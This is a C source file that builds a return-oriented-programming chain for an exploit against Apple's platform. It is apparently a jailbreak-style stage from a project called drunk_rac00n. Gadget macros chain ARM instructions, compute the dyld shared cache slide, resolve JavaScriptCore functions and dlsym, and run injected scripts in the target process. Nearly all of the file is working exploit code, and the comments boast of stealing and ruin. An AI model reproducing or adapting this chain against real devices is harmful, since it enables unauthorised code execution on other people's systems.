/*
 *  drunk_rac00n
 * 
 *  we call this "ROP" round these parts
 *  steal everything, kill everyone, cause total financial ruin.
 *  
 *  this exploit is seriously garbage, but gawd damnit it exploits the thing
 *  
 *  hax
 */

#include <mach-o/dyld.h>
#include "stage2.h"
#include <stdint.h>
#include <stdlib.h>
#include <syslog.h>
#include <dlfcn.h>
#include <stdio.h>

#define MOV_R0(what) do {				\
	chain[chain_len++] = what;			\
	chain[chain_len++] = UNUSED;		\
	chain[chain_len++] = UNUSED;		\
	chain[chain_len++] = UNUSED;		\
	chain[chain_len++] = base + mov_r0;	\
} while (0)

#define CALL(what) do {						\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = what;				\
	chain[chain_len++] = base + nulls_addr;	\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + blx_r5;		\
} while (0)

#define CALL_1ARG(what, arg) do {	\
	MOV_R0(arg);					\
	CALL(what);						\
} while (0)

#define STR_R0(where) do {						\
	chain[chain_len++] = where;					\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = base + str_r0_r4;		\
	chain[chain_len++] = where;					\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = base + mov_r0;			\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = base + ldr_r0_r0;		\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = UNUSED;				\
	chain[chain_len++] = base + nop;			\
} while (0)

#define MOV_R1_R0() do {					\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + mov_r1_r0;	\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + nop;		\
} while (0)

#define DEREF_IN_R0(what) do {				\
	chain[chain_len++] = what;				\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + mov_r0;		\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + ldr_r0_r0;	\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + nop;		\
} while (0)

#define DEREF_R0() do {						\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + ldr_r0_r0;	\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + nop;		\
} while (0)

#define MOV_R1(what) do {					\
	chain[chain_len++] = what;				\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + mov_r0;		\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + mov_r1_r0;	\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + nop;		\
} while (0)

#define ADD_R0_R1() do {					\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + add_r0_r1;	\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = UNUSED;			\
	chain[chain_len++] = base + nop;		\
} while (0)

#define CALL_4_ARG_L2_0(what, arg1, arg2) do {			\
	MOV_R0(0);											\
	STR_R0(base + reserve_addr + 0x40000);				\
	MOV_R0(base + weird_r3);							\
	STR_R0(base + reserve_addr + 0x4014);				\
	MOV_R0(base + reserve_addr + 0x4000);				\
	chain[chain_len++] = UNUSED;						\
	chain[chain_len++] = arg2;							\
	chain[chain_len++] = base + reserve_addr + 0x40000;	\
	chain[chain_len++] = UNUSED;						\
	chain[chain_len++] = base + other_weird_r3;			\
	MOV_R0(arg1);										\
	chain[chain_len++] = UNUSED;						\
	chain[chain_len++] = UNUSED;						\
	chain[chain_len++] = UNUSED;						\
	chain[chain_len++] = UNUSED;						\
	chain[chain_len++] = what;							\
} while (0)												\

#define CALL_4_PTRARG_L2_0(what, arg1, arg2) do {		\
	DEREF_IN_R0(arg1);									\
	STR_R0(stack_base + (chain_len * 4) + 520);			\
	DEREF_IN_R0(arg2);									\
	STR_R0(stack_base + (chain_len * 4) + 340);			\
	MOV_R0(0);											\
	STR_R0(base + reserve_addr + 0x40000);				\
	MOV_R0(base + weird_r3);							\
	STR_R0(base + reserve_addr + 0x4014);				\
	MOV_R0(base + reserve_addr + 0x4000);				\
	chain[chain_len++] = UNUSED;						\
	chain[chain_len++] = 0x32323232;					\
	chain[chain_len++] = base + reserve_addr + 0x40000;	\
	chain[chain_len++] = UNUSED;						\
	chain[chain_len++] = base + other_weird_r3;			\
	MOV_R0(0x31313131);									\
	chain[chain_len++] = UNUSED;						\
	chain[chain_len++] = UNUSED;						\
	chain[chain_len++] = UNUSED;						\
	chain[chain_len++] = UNUSED;						\
	chain[chain_len++] = what;							\
	chain[chain_len++] = 0;								\
	chain[chain_len++] = 0;								\
	chain[chain_len++] = 0;								\
	chain[chain_len++] = 0;								\
	chain[chain_len++] = base + nop;					\
} while (0)												\

#define CALL_SLID_4_ARG_L2_0(what, arg1, arg2) do {	\
	DEREF_IN_R0(base + reserve_addr + 20);			\
	MOV_R1_R0();									\
	MOV_R0(what);									\
	ADD_R0_R1();									\
	STR_R0(stack_base + (chain_len * 4) + 392);		\
	CALL_4_ARG_L2_0(0x12345678, arg1, arg2);		\
} while (0)

#define CALL_SLID(what) do {								\
	STR_R0(base + reserve_addr + 444);						\
	DEREF_IN_R0(base + reserve_addr + 20);					\
	MOV_R1_R0();											\
	MOV_R0(what);											\
	ADD_R0_R1();											\
	STR_R0(base + reserve_addr + 448);						\
	MOV_R1(0);												\
	DEREF_IN_R0(base + reserve_addr + 448);					\
	STR_R0(stack_base + (chain_len * 4) + 96 + (18 * 4));	\
	DEREF_IN_R0(base + reserve_addr + 444);					\
	CALL(0x1234567c);										\
} while (0)

#define CALL_SLID_4_PTRARG_L2_0(what, arg1, arg2) do {	\
	DEREF_IN_R0(base + reserve_addr + 20);				\
	MOV_R1_R0();										\
	MOV_R0(what);										\
	ADD_R0_R1();										\
/*	MOV_R1_R0();										\
	CALL_1ARG(base + printf_addr, base + dyld_shc_base_status); \
*/	STR_R0(stack_base + (chain_len * 4) + 720);			\
	CALL_4_PTRARG_L2_0(0x12345679, arg1, arg2);			\
} while (0)

#define PRINT_STILL_HERE() do {						\
/*	CALL_1ARG(base + printf_addr, 0x109000);	*/\
} while (0)

uintptr_t get_dyld_shc_slide(void) {
	return _dyld_get_image_vmaddr_slide(1);
}

uintptr_t get_dyld_shc_sym_addr(char* sym) {
	return dlsym(RTLD_DEFAULT, sym) - get_dyld_shc_slide();
}

uintptr_t get_dyld_shc_sym_addr_jsc(char* sym) {
	return dlsym(dlopen("/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore", RTLD_LAZY) , sym) - get_dyld_shc_slide();
}

rop_chain_shit gen_rop_chain(uint32_t base,
							 uint32_t we_out_here_addr,
							 uint32_t mov_r0,
							 uint32_t puts_addr,
							 uint32_t blx_r5,
							 uint32_t nulls_addr,
							 uint32_t malloc_addr,
							 uint32_t mov_r1_r0,
							 uint32_t nop,
							 uint32_t malloc_status_addr,
							 uint32_t printf_addr,
							 uint32_t exit_addr,
							 uint32_t str_r0_r4,
							 uint32_t reserve_addr,
							 uint32_t ldr_r0_r0,
							 uint32_t add_r0_r1,
							 uint32_t stack_base,
							 uint32_t dyld_shc_base_status,
							 uint32_t scprefcreate_dsc_offset,
							 uint32_t scprefcreate_lazy_offset,
							 uint32_t weird_r3,
							 uint32_t other_weird_r3) {
	/*
	 *  to quote qwertyoruiop:
	 *  ROP Insanity.
	 *
	 *  Message to security researchers, feds and apple employees:
	 *
	 *  If you want to understand this, you have to hit a blunt.
	 *  I don't care if you're at work. Roll a fat one and smoke it. Right now.
	 *
	 *  If your boss questions this, feel free to tell him to contact me. I'll explain how crucial THC is for this shit.
	 */
	
	/*
	 *  this is definitely overkill
	 */
	uint32_t* chain     = (uint32_t*)calloc(0x100000, sizeof(uint32_t));
	uint32_t  chain_len = 0;

	rop_chain_shit chain_b0i = (rop_chain_shit)malloc(sizeof(struct rop_chain_shit_t));

	/* output "intro" string */
	CALL_1ARG(base + puts_addr, base + we_out_here_addr);

//	CALL_4_ARG_L2_0(base + 0x9ad8c, LOG_SYSLOG, base + we_out_here_addr);

	/* allocate memory for file read later */
	CALL_1ARG(base + malloc_addr, 0x100000);
	STR_R0(base + reserve_addr);
	MOV_R1_R0();

	/* output malloc string */
	CALL_1ARG(base + printf_addr, base + malloc_status_addr);

	/* calculate dyld_shared_cache slide */
	MOV_R0(0 - (0x20000000 + scprefcreate_dsc_offset));
	MOV_R1_R0();
	DEREF_IN_R0(base + scprefcreate_lazy_offset);
	ADD_R0_R1();
	STR_R0(base + reserve_addr + 20);

	/* calculate dyld_shared_cache slide */
	MOV_R0(0 - (scprefcreate_dsc_offset));
	MOV_R1_R0();
	DEREF_IN_R0(base + scprefcreate_lazy_offset);
	ADD_R0_R1();
	STR_R0(base + reserve_addr + 16);
	
	/* print the status string */
	MOV_R1_R0();
	CALL_1ARG(base + printf_addr, base + dyld_shc_base_status);

//	uint32_t slid_b0i = 0x2b14000;

	uint32_t JSContextGroupCreate = get_dyld_shc_sym_addr_jsc("JSContextGroupCreate");
	uint32_t JSGlobalContextCreateInGroup = get_dyld_shc_sym_addr_jsc("JSGlobalContextCreateInGroup");
	uint32_t JSContextGetGlobalObject = get_dyld_shc_sym_addr_jsc("JSContextGetGlobalObject");
	uint32_t JSStringCreateWithUTF8CString = get_dyld_shc_sym_addr_jsc("JSStringCreateWithUTF8CString");
	uint32_t JSEvaluateScript = get_dyld_shc_sym_addr_jsc("JSEvaluateScript");
	uint32_t dlsym_ = get_dyld_shc_sym_addr("dlsym");

	MOV_R0(dlsym_);
	STR_R0(base + reserve_addr + 24);

//	uint32_t settimeofday = get_dyld_shc_sym_addr("settimeofday");

	fprintf(stderr, "0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x\n", JSContextGroupCreate, JSGlobalContextCreateInGroup, JSContextGetGlobalObject, JSStringCreateWithUTF8CString, JSEvaluateScript, dlsym_);

/*
	MOV_R0(0);
	STR_R0(base + 0x140000);
	STR_R0(base + 0x140004);

	MOV_R0(0);
	MOV_R1_R0();
	MOV_R0(base + 0x140000);
	CALL_SLID(settimeofday);
	*/

	PRINT_STILL_HERE();
	CALL_SLID(JSContextGroupCreate);
	STR_R0(base + reserve_addr + 0x40);
	MOV_R1_R0();
	PRINT_STILL_HERE();
	MOV_R1(0);
	DEREF_IN_R0(base + reserve_addr + 0x40);

	CALL_SLID(JSGlobalContextCreateInGroup);
	STR_R0(base + reserve_addr + 0x44);
	MOV_R1_R0();
	PRINT_STILL_HERE();
	DEREF_IN_R0(base + reserve_addr + 0x44);

	CALL_SLID(JSContextGetGlobalObject);
	STR_R0(base + reserve_addr + 0x48);
	PRINT_STILL_HERE();
	DEREF_IN_R0(base + reserve_addr + 0x48);
	MOV_R1_R0();
	MOV_R0(0x108000);
	
	CALL_SLID(JSStringCreateWithUTF8CString);
	STR_R0(base + reserve_addr + 0x48);
	PRINT_STILL_HERE();
	DEREF_IN_R0(base + reserve_addr + 0x48);
	MOV_R1_R0();
	CALL_SLID_4_PTRARG_L2_0(JSEvaluateScript, base + reserve_addr + 0x44, base + reserve_addr + 0x48);
	MOV_R1_R0();
	PRINT_STILL_HERE();

	uint32_t slide = (base) >> 12;

	fprintf(stderr, "%x %x\n", base, stack_base);
	fprintf(stderr, "%x\n", get_dyld_shc_slide());

	MOV_R0(0x422260);
	STR_R0(0x422290);
//	MOV_R0(0x2022260);
//	STR_R0(0x2022290);
	//	MOV_R0(0x422260);
	//	STR_R0(0x422290);

	MOV_R0(0x10a000);
	CALL_SLID(JSStringCreateWithUTF8CString);
	STR_R0(base + reserve_addr + 0x48);
	PRINT_STILL_HERE();
/*
	DEREF_IN_R0(base + reserve_addr + 0x48);
	MOV_R1_R0();
	*/
	CALL_SLID_4_PTRARG_L2_0(JSEvaluateScript, base + reserve_addr + 0x44, base + reserve_addr + 0x48);
	MOV_R1_R0();
	PRINT_STILL_HERE();

	DEREF_IN_R0(0x144444);
	MOV_R1_R0();
	CALL_1ARG(base + printf_addr, base + dyld_shc_base_status);

//	CALL_1ARG(base + printf_addr, 0x109000);

	/* exit */
	CALL_1ARG(base + exit_addr, 69);

	chain_b0i->teh_chain = chain;
	chain_b0i->chain_len = chain_len * 4;

	return chain_b0i;
}
